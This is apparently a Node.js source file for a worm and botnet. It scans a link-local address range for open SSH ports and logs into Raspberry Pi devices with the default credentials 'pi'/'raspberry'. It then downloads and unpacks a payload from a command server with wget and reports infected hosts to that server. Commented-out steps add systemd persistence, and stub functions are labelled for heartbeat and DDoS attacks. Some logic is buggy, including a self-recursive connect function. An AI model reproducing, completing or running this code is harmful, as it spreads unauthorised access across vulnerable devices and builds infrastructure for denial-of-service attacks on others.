var os = require('os');
var ifaces = os.networkInterfaces();
var tcPing = require('tcp-ping');
var nodeSsh = require('node-ssh');
var http = require('http');
const ssh = new nodeSsh();
const axios = require('axios').default;

const passwords = [
    "raspberry",
    "password"
]
let ipAddress;
const commandServer = "192.168.1.6:3030";

/**
 * Attempts to connect to the remote machine to propagate the worm
 * @param {string} ipAddress ipAddress of the target
 */
const attemptConnect = async (ipAddress) => {
    const password = 'raspberry';
    return new Promise(async (resolve, reject) => {
        try {
            if (await attemptConnect(ipAddress)) {
                await ssh.connect({
                    host: ipAddress,
                    port: 22,
                    username: 'pi',
                    password: password
                });
                const wormDirectory = '/worm';
                const sshOptions = {
                    cwd: wormDirectory
                };
                const ls = await ssh.execCommand(`ls ${wormDirectory}`);
                console.log(ls);
                if (ls.stderr) {
                    console.log("dne");
                    // create worm directory
                    await ssh.exec('sudo', ['mkdir', wormDirectory]);

                    // get the executable
                    const wget = await ssh.execCommand(`sudo wget -O worm.tar.gz ${commandServer}/sendFile`, sshOptions);
                    console.log(wget);
                    await ssh.exec('sudo', ['tar', '-xf', 'worm.tar.gz'], sshOptions);
                    await ssh.exec('sudo', ['echo', '#!/bin/bash\ncd'])

                    // // create a system service to run the executable
                    // await ssh.execCommand('echo "[Unit]\nDescription=Echos Hello World\n\n[Service]\nType=simple\nExecStart=/worm/bat.sh\n\n[Install]\nWantedBy=multi-user.target" > test.service');
                    // await ssh.execCommand('sudo mv test.service /etc/systemd/system');
                    // await ssh.execCommand('sudo systemctl daemon-reload');

                    // // enable the executable to start on restarts
                    // await ssh.execCommand('sudo systemctl enable test');

                    // // start the executable
                    // await ssh.execCommand('sudo systemctl start test');
                }
                ssh.dispose();
            }
            resolve(true);
        } catch (ex) {
            ssh.dispose();
            console.log('connect', ex);
            reject(ex);
        }
    })
}

/**
 * Using tcp-ping package probes the ssh port on the remote machine to see if it is active
 * @param {string} host 
 * @param {number} port 
 */
const checkConnectivity = async (host, port) => {
    return await tcPing.probeAsync(ipAddress, 22);
}

const scan = async (localIpAddress) => {
    console.log(localIpAddress);
    const baseIpAddress = "169.254";
    const sshPort = 22;
    const i = 0;
    for (let i = 0; i <= 255; i++) {
        for (let j = 0; j <= 255; j++) {
            ipAddress = `${baseIpAddress}.${i}.${j}`;
            if (ipAddress !== localIpAddress && await checkConnectivity(ipAddress, sshPort)) {
                try {

                    const success = await attemptConnect(ipAddress);
                } catch (ex) {
                    console.log(ex);
                }
            }
        }
    }
}

/**
 * sends a heartbeat to the command server so it knows this bot is still alive
 */
const heartbeat = async () => {

};

/**
 * call the command server to see if a target is available
 */
const checkTarget = async () => {

}

/**
 * Attacks the specified target with a DDOS attack
 * This will probably be extracted into its own file later
 * @param {string} target ip address of the target 
 */
const attack = (target) => {

}

/**
 * On start sends a post to the command server so it knows the bot is live
 * @param {string} serverAddress The ip address for the command server
 */
const connectToServer = (localIp) => {
    axios.post(`${commandServer}/landing`, { ip: localIp, infectedIp: "192.168.1.6" });
}

const getLocalIp = () => {
    let localIpAddress;
    return new Promise((resolve, reject) => {
        Object.keys(ifaces).forEach(ifname => {
            var alias = 0;

            ifaces[ifname].forEach(iface => {
                if ('IPv4' !== iface.family || iface.internal !== false) {
                    // skip over internal (i.e. 127.0.0.1) and non-ipv4 addresses
                    return;
                } else resolve(iface.address);
            });
        });
    })
}


const startBotnet = async () => {
    if (process.argv.length === 3) {
        ipAddress = process.argv[2];
        attemptConnect(ipAddress).catch(ex => { });
    } else {
        const localIp = await getLocalIp();
        connectToServer(localIp);
        scan(localIp);
    }
}

startBotnet();